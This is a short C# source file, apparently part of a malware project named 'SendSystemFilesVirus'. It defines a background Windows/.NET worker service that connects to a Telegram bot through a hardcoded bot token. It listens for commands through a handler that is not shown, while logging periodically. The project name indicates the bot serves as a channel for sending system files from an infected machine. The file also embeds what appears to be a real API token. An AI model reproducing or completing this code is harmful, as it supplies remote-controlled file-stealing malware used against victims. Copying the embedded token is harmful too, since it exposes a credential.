using Telegram.Bot;

namespace SendSystemFilesVirus
{
    public class Worker : BackgroundService
    {

        private readonly ILogger<Worker> _logger;
        public static readonly TelegramBotClient _telegramBotClient = new("6171289441:AAGZdM0PVm7JyUdibDyjz2CWj91h72b04iA");

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
            _telegramBotClient.StartReceiving<TelegramService>();
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                await Task.Delay(5000);
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
            }
        }


    }
}